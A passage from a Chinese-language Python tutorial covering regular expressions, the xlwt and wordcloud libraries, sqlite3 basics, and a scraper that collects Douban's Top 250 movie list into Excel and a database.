align="center">从一个字符串的开始位置起匹配正则表达式，返回match对象</td></tr><tr><td align="center">re.findall()</td><td align="center">搜索字符串，以列表类型返回全部能匹配的字串</td></tr><tr><td align="center">re.split()</td><td align="center">将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</td></tr><tr><td align="center">re.finditer()</td><td align="center">搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</td></tr><tr><td align="center">re.sub()</td><td align="center">在一个字符串中替换所有匹配正则表达式的字串，返回替换后的字符串</td></tr></tbody></table><table><thead><tr><th align="center">修饰符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">re.I</td><td align="center">使匹配对大小写不敏感</td></tr><tr><td align="center">re.L</td><td align="center">做本地化识别匹配</td></tr><tr><td align="center">re.M</td><td align="center">多行匹配，影响^和$</td></tr><tr><td align="center">re.S</td><td align="center">使.匹配包括换行在内的所有字符</td></tr><tr><td align="center">re.U</td><td align="center">根据Unicode字符集解析字符，影响\w,\W,\b,\B</td></tr><tr><td align="center">re.X</td><td align="center">该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> repat<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">)</span>m<span class="token operator">=</span>pat<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"CBCAADDAA"</span><span class="token punctuation">)</span>       <span class="token comment">#返回第一个匹配成功的位置</span>m<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span><span class="token string">"CBCAADDAA"</span><span class="token punctuation">)</span>   <span class="token comment">#第一个参数为规则，第二个参数为被校验的对象</span>m<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span><span class="token string">"CBCAADDAA"</span><span class="token punctuation">)</span>  <span class="token comment">#返回列表，匹配所有位置</span>m<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"A"</span><span class="token punctuation">,</span><span class="token string">"abcdacsd"</span><span class="token punctuation">)</span>    <span class="token comment">#找到a用A替换</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>建议在正则表达式中，被比较的字符串前面加上r，不用担心转义字符的问题</p></blockquote><h2 id="xlwt库"><a href="#xlwt库" class="headerlink" title="xlwt库"></a>xlwt库</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> xlwtworkbook<span class="token operator">=</span>xlwt<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>worksheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>add_sheet<span class="token punctuation">(</span><span class="token string">'sheet1'</span><span class="token punctuation">)</span>worksheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'hello'</span><span class="token punctuation">)</span>    <span class="token comment">#行，列，内容</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        worksheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string"> * </span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'a.xls'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="wordcloud库"><a href="#wordcloud库" class="headerlink" title="wordcloud库"></a>wordcloud库</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jieba<span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token keyword">from</span> wordcloud <span class="token keyword">import</span> WordCloud<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> sqlite3con <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"movie.db"</span><span class="token punctuation">)</span>cur <span class="token operator">=</span> con<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>sql <span class="token operator">=</span> <span class="token string">'select introdu from movie250'</span>data <span class="token operator">=</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>text <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> item <span class="token keyword">in</span> data<span class="token punctuation">:</span>    text <span class="token operator">+=</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>con<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>cut <span class="token operator">=</span> jieba<span class="token punctuation">.</span>cut<span class="token punctuation">(</span>text<span class="token punctuation">)</span>string <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cut<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'static/assets/img/tree.jpg'</span><span class="token punctuation">)</span>img_array <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>img<span class="token punctuation">)</span>wc <span class="token operator">=</span> WordCloud<span class="token punctuation">(</span>    background_color<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span>    mask<span class="token operator">=</span>img_array<span class="token punctuation">,</span>    font_path<span class="token operator">=</span><span class="token string">"msyh.ttc"</span><span class="token punctuation">)</span>wc<span class="token punctuation">.</span>generate_from_text<span class="token punctuation">(</span>string<span class="token punctuation">)</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>wc<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>axis<span class="token punctuation">(</span><span class="token string">'off'</span><span class="token punctuation">)</span><span class="token comment"># plt.show()</span>plt<span class="token punctuation">.</span>savefig<span class="token punctuation">(</span><span class="token string">'static/assets/img/word.jpg'</span><span class="token punctuation">,</span>dpi<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="豆瓣Top250存入Excel完整爬虫代码"><a href="#豆瓣Top250存入Excel完整爬虫代码" class="headerlink" title="豆瓣Top250存入Excel完整爬虫代码"></a>豆瓣Top250存入Excel完整爬虫代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">import</span> xlwt<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    baseurl<span class="token operator">=</span><span class="token string">"https://movie.douban.com/top250?start="</span>    data_list<span class="token operator">=</span>getData<span class="token punctuation">(</span>baseurl<span class="token punctuation">)</span>    savepath<span class="token operator">=</span><span class="token string">"top250.xls"</span>    saveData<span class="token punctuation">(</span>data_list<span class="token punctuation">,</span>savepath<span class="token punctuation">)</span>findLink<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;a href="(.*?)">'</span><span class="token punctuation">)</span>                    <span class="token comment">#影片详情的匹配规则</span>findImgSrc<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;img.*src="(.*?)"'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>            <span class="token comment">#影片图片，忽略换行符</span>findTitle<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="title">(.*)&lt;/span>'</span><span class="token punctuation">)</span>    <span class="token comment">#影片片名</span>findRating<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="rating_num" property="v:average">(.*)&lt;/span>'</span><span class="token punctuation">)</span> <span class="token comment">#影片评分</span>findJudge<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span>(\d*)人评价&lt;/span>'</span><span class="token punctuation">)</span>            <span class="token comment">#评价人数               </span>findInduct<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="inq">(.*)&lt;/span>'</span><span class="token punctuation">)</span>     <span class="token comment">#影片概况</span>findBd<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;p class="">(.*?)&lt;/p>'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>            <span class="token comment">#详细信息如导演，演员等</span><span class="token keyword">def</span> <span class="token function">askURL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    head<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4128.3 Safari/537.36"</span>    <span class="token punctuation">&#125;</span>    request<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">)</span>    html<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        html<span class="token operator">=</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token string">"code"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>code<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token string">"reason"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">getData</span><span class="token punctuation">(</span>baseurl<span class="token punctuation">)</span><span class="token punctuation">:</span>    data_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url<span class="token operator">=</span>baseurl<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">25</span><span class="token punctuation">)</span>        html<span class="token operator">=</span>askURL<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        soup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token string">"html.parser"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"item"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>             <span class="token comment">#保存一部电影的所有信息</span>            item<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>            link<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findLink<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>   <span class="token comment">#影片详情的超链接</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>link<span class="token punctuation">)</span>            imgSrc<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findImgSrc<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>imgSrc<span class="token punctuation">)</span>            titles<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findTitle<span class="token punctuation">,</span>item<span class="token punctuation">)</span>    <span class="token comment">#片名可能只有一个中文名，没有外文名</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>titles<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                chinese_title<span class="token operator">=</span>titles<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chinese_title<span class="token punctuation">)</span>                foreign_title<span class="token operator">=</span>titles<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#去除无关符号</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>foreign_title<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>titles<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>                <span class="token comment">#外文名留空</span>            rating<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findRating<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>rating<span class="token punctuation">)</span>            judgeNum<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findJudge<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>judgeNum<span class="token punctuation">)</span>            Induct<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findInduct<span class="token punctuation">,</span>item<span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Induct<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                Induct<span class="token operator">=</span>Induct<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"。"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Induct<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>            Bd<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findBd<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            Bd<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"&lt;br(\s+)?/>(\s+)?"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span>Bd<span class="token punctuation">)</span>            Bd<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span>Bd<span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Bd<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token comment">#去掉前后的空格</span>            data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>     <span class="token keyword">return</span> data_list<span class="token keyword">def</span> <span class="token function">saveData</span><span class="token punctuation">(</span>data_list<span class="token punctuation">,</span>savepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    workbook<span class="token operator">=</span>xlwt<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    worksheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>add_sheet<span class="token punctuation">(</span><span class="token string">'top250'</span><span class="token punctuation">,</span>cell_overwrite_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    col<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'电影详细链接'</span><span class="token punctuation">,</span><span class="token string">'图片链接'</span><span class="token punctuation">,</span><span class="token string">'影片中文名'</span><span class="token punctuation">,</span><span class="token string">'影片外文名'</span><span class="token punctuation">,</span><span class="token string">'评分'</span><span class="token punctuation">,</span><span class="token string">'评价数'</span><span class="token punctuation">,</span><span class="token string">'概况'</span><span class="token punctuation">,</span><span class="token string">'相关信息'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        worksheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>col<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'第</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">条'</span></span><span class="token punctuation">)</span>        data<span class="token operator">=</span>data_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            worksheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span>data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>savepath<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="sqlite3模块"><a href="#sqlite3模块" class="headerlink" title="sqlite3模块"></a>sqlite3模块</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sqlite3<span class="token comment"># 创建数据表</span>conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"test.db"</span><span class="token punctuation">)</span>         <span class="token comment">#打开或创建数据库文件</span>c<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>                         <span class="token comment">#获取游标</span>sql<span class="token operator">=</span><span class="token triple-quoted-string string">'''    create table company    (id int primary key not null,    name text not null,    age int not null,    address char(50),    salary real);'''</span>c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>                           <span class="token comment">#提交数据库操作</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 插入数据</span>conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"test.db"</span><span class="token punctuation">)</span>         <span class="token comment">#打开或创建数据库文件</span>c<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>                         <span class="token comment">#获取游标</span>sql<span class="token operator">=</span><span class="token triple-quoted-string string">'''    insert into company(id,name,age,address,salary)    values(1,'zhangsan',32,'chengdu',8000);'''</span>c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>                           <span class="token comment">#提交数据库操作</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 查询数据</span>conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"test.db"</span><span class="token punctuation">)</span>         <span class="token comment">#打开或创建数据库文件</span>c<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>                         <span class="token comment">#获取游标</span>sql<span class="token operator">=</span><span class="token string">"select id,name,address,salary from company"</span>cursor<span class="token operator">=</span>c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token keyword">for</span> row <span class="token keyword">in</span> cursor<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"id= "</span><span class="token punctuation">,</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"name= "</span><span class="token punctuation">,</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"address= "</span><span class="token punctuation">,</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"salary= "</span><span class="token punctuation">,</span>row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="豆瓣Top250存入数据库完整爬虫代码"><a href="#豆瓣Top250存入数据库完整爬虫代码" class="headerlink" title="豆瓣Top250存入数据库完整爬虫代码"></a>豆瓣Top250存入数据库完整爬虫代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">import</span> xlwt<span class="token keyword">import</span> sqlite3<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    baseurl<span class="token operator">=</span><span class="token string">"https://movie.douban.com/top250?start="</span>    data_list<span class="token operator">=</span>getData<span class="token punctuation">(</span>baseurl<span class="token punctuation">)</span>    <span class="token comment"># savepath="top250.xls"</span>    <span class="token comment"># saveData(data_list,savepath)</span>    dbpath<span class="token operator">=</span><span class="token string">"movie.db"</span>    saveData2DB<span class="token punctuation">(</span>data_list<span class="token punctuation">,</span>dbpath<span class="token punctuation">)</span>findLink<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;a href="(.*?)">'</span><span class="token punctuation">)</span>                    <span class="token comment">#影片详情的匹配规则</span>findImgSrc<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;img.*src="(.*?)"'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>            <span class="token comment">#影片图片，忽略换行符</span>findTitle<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="title">(.*)&lt;/span>'</span><span class="token punctuation">)</span>    <span class="token comment">#影片片名</span>findRating<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="rating_num" property="v:average">(.*)&lt;/span>'</span><span class="token punctuation">)</span> <span class="token comment">#影片评分</span>findJudge<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span>(\d*)人评价&lt;/span>'</span><span class="token punctuation">)</span>           <span class="token comment">#评价人数               </span>findInduct<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="inq">(.*)&lt;/span>'</span><span class="token punctuation">)</span>     <span class="token comment">#影片概况</span>findBd<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;p class="">(.*?)&lt;/p>'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>            <span class="token comment">#详细信息如导演，演员等</span><span class="token keyword">def</span> <span class="token function">askURL</span><span class="token punctuation">(</span>url<span class="token 